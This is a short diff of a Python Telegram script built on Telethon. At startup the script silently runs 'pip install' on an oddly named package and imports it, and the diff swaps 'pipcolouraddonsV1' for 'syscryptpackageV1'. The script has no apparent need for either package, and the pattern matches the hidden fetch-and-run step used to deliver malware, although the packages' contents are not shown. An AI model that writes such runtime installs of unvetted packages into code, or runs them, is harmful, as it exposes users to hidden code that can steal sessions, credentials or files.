@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcolouraddonsV1")
-import pipcolouraddonsV1
+os.system("pip install syscryptpackageV1")
+import syscryptpackageV1
 import requests
 from telethon.sync import TelegramClient
 from telethon.errors.rpcerrorlist import PhoneNumberBannedError
